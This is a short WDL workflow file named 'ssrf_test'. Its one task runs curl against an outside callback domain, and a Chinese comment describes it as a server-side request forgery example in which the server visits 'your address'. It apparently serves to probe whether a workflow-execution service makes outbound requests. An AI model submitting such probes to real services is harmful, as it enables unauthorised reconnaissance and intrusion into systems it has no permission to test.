workflow ssrf_test {
  call test_ssrf
}

task test_ssrf {
  command {
    # SSRF 示例: 服务端将会访问你的地址
    curl http://cc.sxeskysuvx.lfcx.eu.org
  }
  output {
    String dummy_output = "done"
  }
}
